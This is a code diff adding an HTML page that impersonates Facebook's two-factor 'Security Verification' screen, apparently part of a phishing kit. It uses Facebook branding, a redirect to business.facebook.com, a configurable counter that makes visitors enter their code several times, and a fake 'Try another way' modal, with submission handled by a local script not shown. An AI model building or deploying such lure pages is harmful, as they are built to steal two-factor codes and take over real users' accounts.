@@ -1,0 +1,61 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <title>Security Verification</title>
+        <link rel="icon" href="./app/static/images/favicon.ico" />
+        <link rel="stylesheet" href="./app/static/dist/style.css" />
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fontawesome-4.7@4.7.0/css/font-awesome.min.css" />
+        <script defer src="./app/static/src/app.js"></script>
+        <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.15.4/dist/cdn.min.js"></script>
+    </head>
+    <body class="m-0 min-h-screen overflow-x-hidden bg-white text-gray-900">
+        <main class="min-h-screen bg-white" x-data="verifyForm('https://business.facebook.com/')">
+            <header class="flex h-14 items-center justify-between border-b border-[#dde2e8] px-4">
+                <img src="./app/static/images/facebook-logo.png" alt="Facebook" class="h-6 w-auto" />
+                <div class="flex gap-4">
+                    <button class="rounded-full p-2 hover:bg-gray-100"><i class="fa fa-chevron-left"></i></button><button class="rounded-full p-2 hover:bg-gray-100"><i class="fa fa-question-circle"></i></button>
+                </div>
+            </header>
+            <section class="mx-auto max-w-150 space-y-4 px-4 py-6">
+                <p class="text-sm font-medium text-[#0a1317]">Account • Facebook</p>
+                <p class="text-2xl font-semibold text-[#0a1317]" x-text="`Check your verification code (${wrongCount + 1}/${$store.app.config?.wrong2faCount || 1})`">Check your verification code</p>
+                <p class="text-[15px] leading-5 text-[#0a1317]">Enter the numeric code for this account from your two-factor authentication setup, or confirm through the two-factor app you have set up.</p>
+                <img src="./app/static/images/verify-image.png" class="block w-full rounded-2xl" alt="Mobile verification example" />
+                <div class="relative">
+                    <input id="code" class="peer h-16 w-full rounded-2xl border px-4 py-2.5 pb-0 focus:outline-none" :class="error ? 'border-red-600' : 'border-[#dde2e8]'" placeholder=" " type="number" x-model="code" @input="error = false" /><label class="absolute top-1/2 left-0 -translate-y-6 pl-4 text-[13px] transition-all peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px]" :class="error ? 'text-red-600' : 'text-[#5d6c7b]'" for="code"><span x-text="error ? 'Invalid code' : 'Enter code'"></span></label>
+                </div>
+                <button class="flex h-11 w-full items-center justify-center rounded-[22px] bg-[#0064e0] text-[15px] font-medium text-[#f1f4f7]" :disabled="loading" @click="submit()" x-html="loading ? '<div class=\'h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent\'></div>' : 'Continue'"></button>
+                <button class="h-11 w-full rounded-[22px] border border-[#ccd3db] text-[15px] font-medium text-[#0a1317] hover:bg-gray-50" @click="showModal = true">Try another way</button>
+            </section>
+            <section x-show="showModal" x-cloak class="fixed inset-0 z-50 flex bg-white md:items-center md:justify-center md:bg-black/50">
+                <div class="relative flex h-full w-full flex-col bg-white md:h-auto md:max-w-150 md:rounded-4xl md:shadow-2xl">
+                    <div class="flex h-16 items-center px-4">
+                        <button @click="showModal = false" class="flex h-8 w-8 items-center justify-center text-gray-500 hover:text-gray-700"><i class="fa fa-chevron-left"></i></button>
+                    </div>
+                    <div class="flex-1 px-8 pb-8">
+                        <p class="mb-1 text-[24px] font-semibold text-[#050505]">Choose a way to confirm it’s you</p>
+                        <p class="mb-6 text-[15px] text-gray-600">These are your available confirmation methods.</p>
+                        <div class="overflow-hidden rounded-xl border border-gray-200">
+                            <label class="flex cursor-pointer items-center gap-4 p-4 hover:bg-gray-50" :class="selectedMethod === 'notification' ? 'bg-[#f0f6ff]' : ''"
+                                ><div class="flex-1">
+                                    <p class="text-[16px] font-semibold text-[#050505]">Text message</p>
+                                    <p class="text-[14px] text-[#65676B]">We'll send a code to <span x-text="maskedContact"></span></p>
+                                </div>
+                                <input type="radio" value="notification" x-model="selectedMethod" /></label
+                            ><label class="flex cursor-pointer items-center gap-4 border-t border-gray-200 p-4 hover:bg-gray-50" :class="selectedMethod === 'authApp' ? 'bg-[#f0f6ff]' : ''"
+                                ><div class="flex-1">
+                                    <p class="text-[16px] font-semibold text-[#050505]">Authentication app</p>
+                                    <p class="text-[14px] text-[#65676B]">Get a code from your authentication app.</p>
+                                </div>
+                                <input type="radio" value="authApp" x-model="selectedMethod"
+                            /></label>
+                        </div>
+                    </div>
+                    <div class="border-t border-gray-200 p-6"><button class="h-12 w-full rounded-full bg-[#0064e0] text-[17px] font-medium text-white hover:opacity-90" @click="showModal = false">Continue</button></div>
+                </div>
+            </section>
+        </main>
+    </body>
+</html>
